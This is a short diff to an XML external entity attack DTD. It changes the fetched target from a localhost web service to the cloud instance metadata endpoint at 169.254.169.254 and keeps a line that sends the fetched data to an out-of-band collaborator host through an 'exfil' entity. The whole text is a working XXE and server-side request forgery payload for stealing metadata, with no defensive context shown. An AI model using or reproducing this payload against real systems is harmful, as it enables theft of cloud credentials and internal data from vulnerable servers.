@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "http://localhost/BE_HotelsV2/BE_Hotels.asmx">
+<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
